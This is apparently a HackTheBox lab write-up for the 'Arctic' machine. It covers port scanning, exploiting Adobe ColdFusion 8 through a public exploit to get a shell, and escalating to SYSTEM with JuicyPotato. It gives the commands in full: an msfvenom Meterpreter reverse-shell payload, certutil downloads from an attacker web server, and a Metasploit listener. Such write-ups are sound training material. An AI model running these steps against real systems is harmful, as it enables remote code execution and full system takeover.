# ARCTIC

Date: 2024-12-12
Target: `10.10.10.11`

Save in a target file:

```bash
echo 10.10.10.11 > target
```

Added also in the hosts file as `artic.htb`.

## Gain Access

### Port Scan Enumeration

I run a full tcp ports scan:

```bash
nmap -p- -v -iL=target -oN nmap/tcp_ports.txt
```

I discovered the following open ports:

* `135`
* `8500`
* `49154`

Performing an aggressive ports scan:

```bash
nmap -p135,8500,49154 -v -iL target -A -oN nmap/target_ports.txt -oX nmap/target_ports.txt

```

I haven't get any more information.
I tried to enumerate them with `telnet` and `nc`, but they did't give me any information.
On the browser I got a web page: `http://artic.htb:8500/`.

### HTTP - Port 8500

I found an administrator login page at: `http://artic.htb:8500/CFIDE/administrator/` and its an **Adobe Coldfusion 8**.
I search for a possibile vulnerability over the internet and I found it, then I used `searchsploit` and I found the same:

```bash
searchsploit Adobe Coldfusion 8
searchsploit -m 50057
```

![image](https://github.com/user-attachments/assets/1fe12b8e-0136-423b-925b-93fe40f8aebd)

I changed some configuration inside the file and I got the shell:

![image](https://github.com/user-attachments/assets/0ad09701-8968-4c4c-9f45-80530f2a3e6b)

## Privilege Escalation

### 1. Token Impersonation via JuicyPotato
#### Initial Findings
Checking privileges revealed `SeImpersonatePrivilege` enabled:
```bash
whoami /priv
```

#### Exploitation
1. **Download JuicyPotato** on your local machine:
   ```bash
   wget "https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe"
   ```
2. **Generate a Meterpreter Reverse Shell**:
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your_IP> LPORT=8887 -f exe -o shell.exe
   ```
3. **Start a Web Server**:
   ```bash
   python3 -m http.server 8081
   ```
4. **Transfer Exploits to the Target**:
   ```bash
   cd %TEMP%
   certutil -UrlCache -f http://<IP>:8081/JuicyPotato.exe JuicyPotato.exe
   certutil -UrlCache -f http://<IP>:8081/shell.exe shell.exe
   ```
5. **Start Listener**:
   ```bash
   msfconsole
   use exploit/multi/handler
   set PAYLOAD windows/meterpreter/reverse_tcp
   set LHOST <your_IP>
   set LPORT 8887
   run
   ```
6. **Run JuicyPotato**:
   ```bash
   .\JuicyPotato.exe -t * -p shell.exe -l 443
   ```

**Outcome**: Obtained a Meterpreter session with `NT AUTHORITY\SYSTEM` privileges.

***

## Resources

* [Adobe ColdFusion 8 - Remote Command Execution (RCE)](https://www.exploit-db.com/exploits/50057)

***
